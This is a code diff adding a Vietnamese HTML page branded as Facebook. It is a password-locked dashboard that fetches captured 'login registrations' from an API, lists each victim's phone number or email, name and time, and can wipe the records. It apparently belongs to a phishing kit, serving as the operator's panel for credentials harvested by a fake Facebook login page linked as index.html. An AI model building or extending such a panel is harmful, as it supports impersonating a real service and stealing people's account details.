@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Dữ liệu đăng nhập</title>
+  <link rel="icon" type="image/svg+xml" href="facebook-favicon.svg">
+  <link rel="stylesheet" href="login-dashboard.css">
+  <link rel="stylesheet" href="dashboard-auth.css">
+  <script src="site-config.js"></script>
+</head>
+<body>
+  <main class="dashboard-page">
+    <section class="dashboard-auth" aria-labelledby="auth-heading">
+      <form class="auth-card" id="dashboard-auth-form">
+        <p class="eyebrow">Facebook</p>
+        <h1 id="auth-heading">Xác thực bảng điều khiển</h1>
+        <p>Nhập mật khẩu để tiếp tục.</p>
+        <label for="dashboard-password">Mật khẩu</label>
+        <input id="dashboard-password" type="password" autocomplete="current-password" required>
+        <button class="auth-submit" type="submit">Xác nhận</button>
+        <p id="dashboard-auth-error" class="auth-error" role="alert" hidden>Mật khẩu không chính xác</p>
+      </form>
+    </section>
+    <div class="dashboard-content" aria-hidden="true">
+    <header class="dashboard-header">
+      <div>
+        <p class="eyebrow">Facebook</p>
+        <h1>Dữ liệu đăng nhập và đăng ký</h1>
+        <p class="subtitle">Theo dõi các lượt đăng ký tài khoản đã ghi nhận.</p>
+      </div>
+      <nav class="header-actions" aria-label="Điều hướng dashboard">
+        <a href="dashboard.html">Dữ liệu trường học</a>
+        <a href="index.html">Trang đăng nhập</a>
+        <button id="lock-dashboard" class="lock-button" type="button">Khóa lại</button>
+      </nav>
+    </header>
+
+    <section class="summary-grid" aria-label="Tổng quan">
+      <article class="summary-card">
+        <span class="card-label">Tổng lượt đăng nhập</span>
+        <strong id="total-count">0</strong>
+      </article>
+      <article class="summary-card accent-card">
+        <span class="card-label">Lượt gần nhất</span>
+        <strong id="latest-time">Chưa có dữ liệu</strong>
+      </article>
+    </section>
+
+    <section class="registrations-section" aria-labelledby="login-heading">
+      <div class="section-heading">
+        <div>
+          <p class="eyebrow">Lịch sử</p>
+          <h2 id="login-heading">Thông tin đăng nhập đăng ký</h2>
+        </div>
+        <button id="clear-data" class="clear-button" type="button">Xóa lịch sử</button>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Số di động hoặc email</th>
+              <th>Tên</th>
+              <th>Thời gian</th>
+            </tr>
+          </thead>
+          <tbody id="login-list"></tbody>
+        </table>
+        <p id="empty-state" class="empty-state">Chưa có dữ liệu đăng nhập đăng ký.</p>
+      </div>
+    </section>
+    </div>
+  </main>
+
+  <script src="dashboard-auth.js"></script>
+  <script>
+    const totalCount = document.querySelector('#total-count');
+    const latestTime = document.querySelector('#latest-time');
+    const loginList = document.querySelector('#login-list');
+    const emptyState = document.querySelector('#empty-state');
+
+    const formatDate = (value) => {
+      const elapsedSeconds = Math.max(0, Math.floor((Date.now() - new Date(value).getTime()) / 1000));
+      if (elapsedSeconds < 1) return 'Vừa xong';
+      if (elapsedSeconds < 60) return `${elapsedSeconds} giây trước`;
+      const elapsedMinutes = Math.floor(elapsedSeconds / 60);
+      if (elapsedMinutes < 60) return `${elapsedMinutes} phút trước`;
+      const elapsedHours = Math.floor(elapsedMinutes / 60);
+      if (elapsedHours < 24) return `${elapsedHours} giờ trước`;
+      return `${Math.floor(elapsedHours / 24)} ngày trước`;
+    };
+
+    const renderDashboard = async () => {
+      const response = await fetch((window.API_BASE || '') + '/api/login-registrations');
+      if (!response.ok) throw new Error('Không thể tải dữ liệu đăng nhập.');
+      const registrations = await response.json();
+      totalCount.textContent = registrations.length;
+      latestTime.textContent = registrations.length ? formatDate(registrations[0].registered_at) : 'Chưa có dữ liệu';
+      loginList.innerHTML = '';
+      emptyState.hidden = registrations.length > 0;
+
+      registrations.forEach((registration) => {
+        const row = document.createElement('tr');
+        const identityCell = document.createElement('td');
+        identityCell.dataset.label = 'Số di động hoặc email';
+        identityCell.textContent = registration.identity;
+        const nameCell = document.createElement('td');
+        nameCell.dataset.label = 'Tên';
+        nameCell.textContent = registration.display_name;
+        const timeCell = document.createElement('td');
+        timeCell.dataset.label = 'Thời gian';
+        timeCell.textContent = formatDate(registration.registered_at);
+        row.append(identityCell, nameCell, timeCell);
+        loginList.appendChild(row);
+      });
+    };
+
+    document.querySelector('#clear-data').addEventListener('click', async () => {
+      await fetch((window.API_BASE || '') + '/api/login-registrations', { method: 'DELETE' });
+      renderDashboard();
+    });
+
+    const loadDashboard = () => renderDashboard().catch(() => {
+      emptyState.textContent = 'Không thể kết nối cơ sở dữ liệu.';
+      emptyState.hidden = false;
+    });
+
+    document.addEventListener('dashboard-authenticated', loadDashboard);
+  </script>
+</body>
+</html>
